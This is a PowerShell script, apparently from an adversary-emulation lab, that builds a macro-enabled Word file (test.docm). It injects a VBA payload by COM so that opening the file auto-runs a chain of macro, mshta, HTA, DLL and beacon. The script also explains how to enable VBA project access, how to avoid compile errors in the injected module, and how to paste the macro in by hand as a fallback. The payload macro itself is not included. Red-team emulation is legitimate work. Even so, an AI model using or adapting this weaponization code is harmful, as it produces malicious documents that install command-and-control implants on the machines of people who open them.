<#
.SYNOPSIS
Run on WS01 (with Microsoft Word installed). Creates a macro-enabled
document (test.docm) that embeds the c0015 entry macro so that opening
the document auto-executes macro -> mshta -> HTA -> DLL -> beacon (S1..S3).

Requirements for programmatic VBA injection to work:
  - Word: Options > Trust Center > Macro Settings >
      * "Enable VBA macros"  (or place test.docm in a Trusted Location)
      * "Trust access to the VBA project object model"  (NEEDED for COM injection)
  If "Trust access..." is off, Word raises 0x800A802D ("Project is unviewable").
  Use the -SkipInject fallback to build a macro-enabled docm without injecting,
  then paste the macro manually (Alt+F11, Insert > Module, paste macro_payload.vba).

.PARAMETER MacroSource  Path to payloads/docm/macro_payload.vba (default).
.PARAMETER OutPath      Where to save test.docm (default Desktop\test.docm).
.PARAMETER SkipInject   Do not inject VBA via COM; just create an empty .docm
                        (manual paste fallback).
.EXAMPLE
powershell -ExecutionPolicy Bypass -File payloads/packaging/install_macro_docm.ps1 -MacroSource .\macro_payload.vba
#>
param(
    [string]$MacroSource = (Join-Path $PSScriptRoot '..\docm\macro_payload.vba'),
    [string]$OutPath = (Join-Path ([Environment]::GetFolderPath('Desktop')) 'test.docm'),
    [switch]$SkipInject,
    [switch]$InjectIntoDocument   # legacy: inject into ThisDocument (collides with Document members -> keep OFF by default)
)
$ErrorActionPreference = 'Stop'

# ---- prerequisite: Word installed ----
$wordProg = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\winword.exe' -ErrorAction SilentlyContinue
if (-not $wordProg) { throw "Word not found on WS01 - verify ODT Word install (M-1 gate) before continuing." }
if (-not $SkipInject -and -not (Test-Path -LiteralPath $MacroSource)) { throw "macro source not found: $MacroSource" }

# ---- preflight: is programmatic VBA access enabled? (informational) ----
$accessVBOM = (Get-ItemProperty 'HKCU:\Software\Microsoft\Office\16.0\Word\Security' -Name AccessVBOM -ErrorAction SilentlyContinue).AccessVBOM
if ($null -eq $accessVBOM) { $accessVBOM = (Get-ItemProperty 'HKCU:\Software\Microsoft\Office\15.0\Word\Security' -Name AccessVBOM -ErrorAction SilentlyContinue).AccessVBOM }
if (-not $SkipInject -and $accessVBOM -ne 1) {
    Write-Warning "AccessVBOM is not 1. If COM injection fails with 0x800A802D, enable: Word > Options > Trust Center > Macro Settings > 'Trust access to the VBA project object model'."
}

if ($SkipInject) {
    # ---- fallback: create an empty macro-enabled docm for manual macro paste ----
    $word = New-Object -ComObject Word.Application
    $word.Visible = $true
    try {
        $doc = $word.Documents.Add()
        $doc.SaveAs([ref]$OutPath, [ref]13)   # 13 = wdFormatXMLDocumentMacroEnabled
        $doc.Close()
        Write-Output "empty docm created (manual paste): $OutPath"
        Write-Output "Open it: Alt+F11 -> Insert > Module -> paste macro_payload.vba -> save."
    }
    finally {
        if ($null -ne $word) { $word.Quit() }
        if ($word) { [System.Runtime.Interopservices.Marshal]::ReleaseComObject($word) | Out-Null }
    }
    return
}

# ---- COM injection ----
$code = Get-Content -LiteralPath $MacroSource -Raw
# strip VB_Name attribute / any module-attribute lines (invalid via AddFromString)
$code = $code -replace '(?m)^Attribute\s+VB_Name.*$', ''

# guard: the source must define exactly one auto-trigger entry macro - RunEntry
# (ThisDocument flow) or AutoOpen (standard-module flow); a duplicated block
# causes VBA "compile error: ambiguous name detected".
$entryCount = ([regex]::Matches($code, '(?m)^\s*Public Sub (RunEntry|AutoOpen)\b')).Count
if ($entryCount -ne 1) {
    throw "macro source must define exactly one entry macro (Public Sub RunEntry OR Public Sub AutoOpen); found $entryCount in $MacroSource. Re-copy macro source from the repository and retry."
}

$word = New-Object -ComObject Word.Application
# visible helps the Word VBE work reliably during injection
$word.Visible = $true
try {
    $doc = $word.Documents.Add()

    # Inject THIS DOCUMENT's own VB project (Document.VBProject). Use a STANDARD
    # MODULE (not ThisDocument): the ThisDocument object module derives from the
    # Document class, so injected Document_Open/AutoOpen collide with inherited
    # members -> "Compile error: member already exists in an object module from
    # which this object module derives" (reproduced 2026-10-02). AutoOpen in a
    # standard module still auto-runs when the document opens (Word auto-macro).
    $proj = $doc.VBProject
    if ($InjectIntoDocument) {
        $cm = $proj.VBComponents('ThisDocument').CodeModule
        if ($cm.CountOfLines -gt 0) { $cm.DeleteLines(1, $cm.CountOfLines) }
        $cm.AddFromString($code)
    } else {
        $mod = $proj.VBComponents.Add(1)   # vbext_ct_StdModule
        $mod.Name = 'c0015Payload'
        $cm = $mod.CodeModule
        $cm.AddFromString($code)
    }

    # SaveAs FileFormat 13 = wdFormatXMLDocumentMacroEnabled (.docm)
    $doc.SaveAs([ref]$OutPath, [ref]13)
    $doc.Close()
    Write-Output "docm created: $OutPath"
    Write-Output "Open it with macros enabled to auto-run the chain (verify C2-SIM log)."
}
catch {
    if ($null -ne $word) { try { $word.Quit() } catch {} }
    throw "VBA injection failed: $($_.Exception.Message). Enable 'Trust access to the VBA project object model', or use -SkipInject and paste the macro manually."
}
finally {
    if ($null -ne $word) { try { $word.Quit() } catch {} }
    if ($word) { [System.Runtime.Interopservices.Marshal]::ReleaseComObject($word) | Out-Null }
}